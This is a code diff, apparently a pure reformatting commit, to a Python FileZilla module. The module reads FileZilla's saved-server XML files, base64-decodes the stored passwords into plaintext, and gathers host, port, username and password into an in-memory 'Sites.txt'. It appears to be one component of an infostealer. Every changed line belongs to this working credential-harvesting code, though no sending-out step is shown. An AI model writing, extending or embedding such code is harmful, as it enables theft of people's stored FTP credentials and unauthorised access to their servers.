@@ -11,8 +11,8 @@ class FileZilla:
     """
     Collects hosts from the FileZilla.
     """
-    def __init__(self, folder: str):
 
+    def __init__(self, folder: str):
         self.__file = path.join(folder, "Sites.txt")
         self.__config = FileZillaConfig()
         self.__storage = MemoryStorage()
@@ -40,31 +40,52 @@ class FileZilla:
 
         for file in data_files:
             try:
-
-                root = ElementTree.parse(path.join(self.__config.SitesPath, file)).getroot()
+                root = ElementTree.parse(
+                    path.join(self.__config.SitesPath, file)
+                ).getroot()
                 data = self.__config.FileZillaData
 
                 if not root:
                     continue
 
                 for server in root[0].findall("Server"):
-
-                    site_name = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
-                    site_user = server.find("User").text if hasattr(server.find("User"), "text") else ""
-                    site_pass = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
-                    site_host = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
-                    site_port = server.find("Port").text if hasattr(server.find("Port"), "text") else ""
+                    site_name = (
+                        server.find("Name").text
+                        if hasattr(server.find("Name"), "text")
+                        else ""
+                    )
+                    site_user = (
+                        server.find("User").text
+                        if hasattr(server.find("User"), "text")
+                        else ""
+                    )
+                    site_pass = (
+                        server.find("Pass").text
+                        if hasattr(server.find("Pass"), "text")
+                        else ""
+                    )
+                    site_host = (
+                        server.find("Host").text
+                        if hasattr(server.find("Host"), "text")
+                        else ""
+                    )
+                    site_port = (
+                        server.find("Port").text
+                        if hasattr(server.find("Port"), "text")
+                        else ""
+                    )
                     site_pass = b64decode(site_pass).decode("utf-8")
 
-                    temp.append(data.format(site_name, site_user, site_pass, site_host, site_port))
+                    temp.append(
+                        data.format(
+                            site_name, site_user, site_pass, site_host, site_port
+                        )
+                    )
 
             except Exception as e:
                 print(f"[FileZilla]: {file} - {repr(e)}")
 
-        self.__storage.add_from_memory(
-            self.__file,
-            "".join(item for item in temp)
-        )
+        self.__storage.add_from_memory(self.__file, "".join(item for item in temp))
 
     def run(self) -> List:
         """
@@ -77,7 +98,6 @@ class FileZilla:
         - None.
         """
         try:
-
             self.__get_hosts()
 
             return self.__storage.get_data()
